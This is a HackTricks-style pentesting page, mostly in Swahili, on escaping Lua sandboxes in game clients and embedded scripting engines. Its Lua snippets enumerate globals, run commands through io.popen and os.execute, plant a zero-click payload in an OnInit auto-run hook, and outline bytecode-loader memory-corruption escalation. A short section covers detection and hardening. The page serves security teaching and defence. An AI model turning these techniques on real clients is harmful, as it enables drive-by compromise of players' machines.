# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ukurasa huu unakusanya mbinu za vitendo za kuorodhesha na kutoroka kutoka kwenye "sandboxes" za Lua zilizopachikwa kwenye applications (hasa game clients, plugins, au in-app scripting engines). Engines nyingi hufichua mazingira ya Lua yenye vizuizi, lakini huacha globals zenye nguvu zikiwa zinafikiwa, jambo linalowezesha arbitrary command execution au hata native memory corruption wakati bytecode loaders zimefichuliwa.

Mawazo muhimu:
- Ichukulie VM kama mazingira usiyoyajua: orodhesha _G na gundua ni dangerous primitives zipi zinazoweza kufikiwa.
- Wakati stdout/print imezuiwa, tumia vibaya channel yoyote ya ndani ya VM ya UI/IPC kama output sink ili kuchunguza matokeo.
- Ikiwa io/os imefichuliwa, mara nyingi unapata direct command execution (io.popen, os.execute).
- Ikiwa load/loadstring/loadfile zimefichuliwa, kutekeleza crafted Lua bytecode kunaweza kuvuruga memory safety katika baadhi ya versions (verifiers za ≤5.1 zinaweza bypassiwa; 5.2 iliondoa verifier), na kuwezesha advanced exploitation.

## Orodhesha mazingira ya sandbox

- Dump global environment ili kuorodhesha tables/functions zinazoweza kufikiwa:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ikiwa `print()` haipatikani, tumia upya njia za mawasiliano za ndani ya VM. Mfano kutoka kwa script VM ya MMO housing ambapo chat output hufanya kazi tu baada ya kuitisha sound call; ifuatayo huunda output function inayotegemeka:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalize muundo huu kwa target yako: textbox, toast, logger, au UI callback yoyote inayokubali strings inaweza kutumika kama stdout kwa reconnaissance.

## Direct command execution if io/os is exposed

Ikiwa sandbox bado inaonyesha standard libraries io au os, huenda ukawa na immediate command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Maelezo:

- Utekelezaji hufanyika ndani ya process ya client; tabaka nyingi za anti-cheat/antidebug zinazozuia debuggers za nje hazitazuia uundaji wa process ndani ya VM.
- Pia kagua: package.loadlib (upakiaji wa DLL/.so za kiholela), require yenye native modules, ffi ya LuaJIT (ikiwa ipo), na debug library (inaweza kuongeza privileges ndani ya VM).

## Zero-click triggers kupitia auto-run callbacks

Ikiwa host application inasukuma scripts kwa clients na VM inaweka wazi auto-run hooks (k.m., OnInit/OnLoad/OnEnter), weka payload yako hapo ili kufanya drive-by compromise mara tu script inapopakiwa:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Callback yoyote inayolingana (OnLoad, OnEnter, n.k.) inapanua mbinu hii wakati scripts zinapotumwa na kutekelezwa kwenye client kiotomatiki.

## Primitives hatari za kutafuta wakati wa recon

Wakati wa kuorodhesha _G, tafuta hasa:
- io, os: io.popen, os.execute, file I/O, ufikiaji wa env.
- load, loadstring, loadfile, dofile: kutekeleza source au bytecode; inaruhusu kupakia bytecode isiyoaminika.
- package, package.loadlib, require: kupakia dynamic library na module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, na hooks.
- LuaJIT-only: ffi.cdef, ffi.load ili kuita native code moja kwa moja.

Mifano ya matumizi ya msingi (ikiwa inafikika):

Lua's loader API ilibadilika katika matoleo mbalimbali: katika Lua 5.1, `load` husoma kutoka kwenye reader function na `loadstring` husoma kutoka kwenye string; Lua 5.2's `load` hukubali string au reader function, na `loadstring` imepitwa na wakati kwa kuwa ni equivalent yake.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalation ya hiari: kutumia vibaya Lua bytecode loaders

Wakati load/loadstring/loadfile zinaweza kufikiwa lakini io/os zimewekewa vikwazo, kutekeleza Lua bytecode iliyoundwa maalum kunaweza kusababisha primitives za kufichua na kuharibu memory. Mambo muhimu:
- Lua ≤ 5.1 ilisafirishwa ikiwa na bytecode verifier ambayo ina bypasses zinazojulikana.<sup>[[4]](#references)</sup>
- Lua 5.2 iliondoa verifier kabisa (msimamo rasmi: applications zinapaswa kukataa tu precompiled chunks), hivyo kupanua attack surface ikiwa bytecode loading haijapigwa marufuku.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows kwa kawaida hufuata hatua hizi: ku-leak pointers kupitia in-VM output, kuunda bytecode inayosababisha type confusions (kwa mfano, kuzunguka FORLOOP au opcodes nyingine), kisha kugeukia arbitrary read/write au native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Njia hii inategemea engine/version maalum na inahitaji RE. Tazama references kwa uchambuzi wa kina, exploitation primitives, na mifano ya gadgetry kwenye games.

## Maelezo ya detection na hardening (kwa defenders)

- Server side: kataa au andika upya user scripts; ruhusu safe APIs zilizo kwenye allowlist; ondoa au funga kwa thamani tupu io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: endesha Lua ikiwa na _ENV ndogo, kataza bytecode loading, reintroduce bytecode verifier madhubuti au signature checks, na zuia process creation kutoka kwenye client process.
- Telemetry: toa alert wakati gameclient → child process creation inapotokea muda mfupi baada ya script load; korelisha na matukio ya UI/chat/script.

## References

- [1] [Nyumba hii ina haunted: RCE ya muongo mmoja uliopita katika AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Uchanganuzi wa Bytecode: Kufichua dosari za usalama za Lua katika Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Majadiliano kuhusu kuondoa bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Kutumia vibaya Lua 5.1 bytecode (gist yenye verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Mwongozo wa Marejeo wa Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Mwongozo wa Marejeo wa Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
